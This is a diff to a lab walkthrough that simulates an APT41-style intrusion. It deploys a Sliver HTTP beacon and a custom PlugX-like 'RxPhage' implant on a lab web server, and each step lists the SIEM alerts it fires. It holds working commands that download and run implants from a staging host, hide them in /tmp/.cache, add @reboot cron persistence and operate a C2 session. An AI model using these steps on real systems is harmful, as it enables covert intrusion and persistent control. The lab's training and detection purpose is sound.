@@ -22,6 +22,8 @@ commands that must run on the **host machine** (not inside Kali — Docker is no
 - [Phase 0: Reconnaissance](#phase-0-reconnaissance)
 - [Phase 1: Initial Access — Log4Shell](#phase-1-initial-access--log4shell-cve-2021-44228)
 - [Phase 2: Foothold — Webshell + Implant](#phase-2-foothold--webshell--implant)
+  - [2.3 Deploy Sliver Beacon (Operational C2)](#23-deploy-sliver-beacon-operational-c2)
+  - [2.4 Deploy RxPhage Implant (Malware Analysis Artifact)](#24-deploy-rxphage-implant-malware-analysis-artifact)
 - [Phase 3: Discovery](#phase-3-discovery)
 - [Phase 4: Credential Access](#phase-4-credential-access)
 - [Phase 5: Lateral Movement](#phase-5-lateral-movement)
@@ -418,78 +420,150 @@ web01
 **SIEM alert fired:**
 - Wazuh: File created in Tomcat webroot — **HIGH**
 
-### 2.3 Deploy RxPhage Implant
+### 2.3 Deploy Sliver Beacon (Operational C2)
 
-**Why RxPhage:** A reverse shell dies if the connection drops. The RxPhage Go beacon connects OUT to
-the Sliver C2 on a schedule — if the connection drops, it just reconnects on the next interval.
-Cron `@reboot` means it restarts even if the container restarts.
+**Why a Sliver beacon:** The reverse shell is fragile — one dropped packet kills it. The Sliver
+beacon connects OUT to C2 on a schedule and reconnects automatically. This is the primary
+persistent access channel for Phases 3–8.
 
-> **Pre-built binary:** `/opt/tools/rxphage/rxphage` is volume-mounted from the host into Kali at
-> `/opt/tools/rxphage/rxphage`. See [rxphage-malware.md](rxphage-malware.md) if you need to build it.
+> **RxPhage vs Sliver beacon:** These are two separate binaries with different roles.
+> The Sliver beacon is your operational C2 shell. RxPhage (§2.4) is the PlugX-like custom
+> implant that is the subject of the malware analysis article — it does NOT connect to Sliver.
+
+**Step 1 — Generate the beacon (run once; binary persists in c2/loot volume):**
 
 ```bash
-[KALI] — Terminal 2: serve tools directory on port 8900
-ls -lh /opt/tools/rxphage/rxphage    # confirm binary exists
-file /opt/tools/rxphage/rxphage      # should be: ELF 64-bit LSB executable, x86-64
+[C2] — from host, open Sliver console
+docker exec -it dragonrx_c2 sliver
 
+sliver > http --lhost 10.0.0.10 --lport 80
+# [*] Successfully started job #N
+
+sliver > generate beacon \
+    --http 10.0.0.10:80 \
+    --os linux --arch amd64 \
+    --name dragonrx_beacon \
+    --beacon-interval 30s \
+    --beacon-jitter 5s \
+    --save /opt/loot/ \
+    --skip-symbols
+# [*] Build completed in Xs
+# [*] Implant saved to /opt/loot/dragonrx_beacon
+```
+
+**Step 2 — Copy beacon to Kali's staging directory (run from host):**
+
+```bash
+[HOST]
+docker cp dragonrx_c2:/opt/loot/dragonrx_beacon \
+    ./attacker/tools/rxphage/dragonrx_beacon
+```
+
+**Step 3 — Start the staging HTTP server on Kali:**
+
+```bash
+[KALI] — Terminal 2
+# Kill any stale server on 8900 first, then start fresh
+fuser -k 8900/tcp 2>/dev/null || true
 python3 -m http.server 8900 --directory /opt/tools/ &
 # Serving HTTP on 0.0.0.0 port 8900 ...
+
+# Confirm both binaries are available
+ls /opt/tools/rxphage/
+# dragonrx_beacon  rxphage  rxphage.exe
 ```
+
+**Step 4 — Download and run on web01:**
 
 ```bash
 [WEB01 — via reverse shell or webshell]
-# Download from Kali's staging server (10.0.0.5 is reachable from web01)
 mkdir -p /tmp/.cache
+wget -q http://10.0.0.5:8900/rxphage/dragonrx_beacon -O /tmp/.cache/dragonrx_beacon
+chmod +x /tmp/.cache/dragonrx_beacon
+nohup /tmp/.cache/dragonrx_beacon &>/dev/null &
+echo "Beacon PID: $!"
+```
+
+**Step 5 — Verify session in Sliver (check-in within ~35 seconds):**
+
+```bash
+[C2]
+sliver > sessions
+```
+
+**Expected:**
+```
+ID  Name             Transport  RemoteAddress         Hostname  Username  OS/Arch      Last Message
+1   dragonrx_beacon  http       10.0.0.100:XXXXX      web01     root      linux/amd64  5s ago
+```
+
+**SIEM alert fired:**
+- Zeek conn.log: Outbound HTTP beaconing to internal C2 (10.0.0.10:80) — **HIGH**
+
+---
+
+### 2.4 Deploy RxPhage Implant (Malware Analysis Artifact)
+
+**What RxPhage is:** A custom Go implant mirroring APT41's PlugX behavioral patterns — XOR-encoded
+config, jittered beacon loop, VM/debugger detection, cron persistence. It is the subject of
+[rxphage-malware.md](rxphage-malware.md). In the lab it runs silently in the background;
+the interesting part is static reverse engineering (Ghidra walkthrough in the article).
+
+> RxPhage attempts to beacon to `updates.oracle-cdn.com` (XOR-encoded in the binary, key `0x4C`).
+> That domain does not resolve in the lab — the beacon loop retries silently. This is intentional:
+> the malware analysis shows how analysts recover the hidden C2 domain from the binary.
+
+```bash
+[KALI] — Terminal 2 (http.server already running from §2.3)
+ls -lh /opt/tools/rxphage/rxphage
+file /opt/tools/rxphage/rxphage
+# ELF 64-bit LSB executable, x86-64, statically linked, stripped
+```
+
+```bash
+[WEB01]
 wget -q http://10.0.0.5:8900/rxphage/rxphage -O /tmp/.cache/rxphage
 chmod +x /tmp/.cache/rxphage
 
-# Verify download succeeded
-ls -lh /tmp/.cache/rxphage
 file /tmp/.cache/rxphage
 # ELF 64-bit LSB executable, x86-64, statically linked
 
-# Install cron persistence
-# @reboot runs once at startup — survives container/VM restarts
+# Cron persistence — @reboot survives container restarts
 (crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -
-
-# Verify cron was written
 crontab -l
 # @reboot /tmp/.cache/rxphage
 
-# Start the implant NOW without waiting for a reboot
 nohup /tmp/.cache/rxphage &>/dev/null &
 echo "RxPhage PID: $!"
 ```
 
-**Switch to Sliver C2 and wait for the beacon:**
+**Verify both implants are running:**
 ```bash
-[C2] — new terminal
-docker exec -it dragonrx_c2 sliver
-
-sliver > sessions
+[WEB01]
+ps aux | grep -E 'dragonrx_beacon|rxphage' | grep -v grep
+# root  1027  dragonrx_beacon
+# root  1079  rxphage
 ```
 
-**Expected — beacon appears within 60 seconds (default check-in interval):**
-```
-ID  Name   Transport  RemoteAddress            Hostname  Username  OS/Arch         Last Message
-1   WEB01  https      192.168.10.100:43221     web01     root      linux/amd64     3s ago
-```
+**SIEM alerts fired:**
+- Wazuh: Executable launched from /tmp — **HIGH**
+- Zeek dns.log: Query for `updates.oracle-cdn.com` (NX) — **MEDIUM**
 
 ```bash
-sliver > use 1          # or: use WEB01
-sliver (WEB01) > whoami
+sliver > use 1          # or: use dragonrx_beacon
+sliver (dragonrx_beacon) > whoami
 # root
 
-sliver (WEB01) > ifconfig
+sliver (dragonrx_beacon) > ifconfig
 # eth0   10.0.0.100/24
 # eth1   192.168.10.100/24
 # lo     127.0.0.1/8
 
-sliver (WEB01) > getpid
-# 1847
+sliver (dragonrx_beacon) > getpid
+# 1027
 ```
 
-You now have persistent, encrypted HTTPS C2 to WEB01. Close the raw reverse shell — you don't need
+You now have persistent HTTP C2 to WEB01. Close the raw reverse shell — you don't need
 it anymore. The Sliver session survives as long as the container runs, and restores after reboot via
 cron.
 
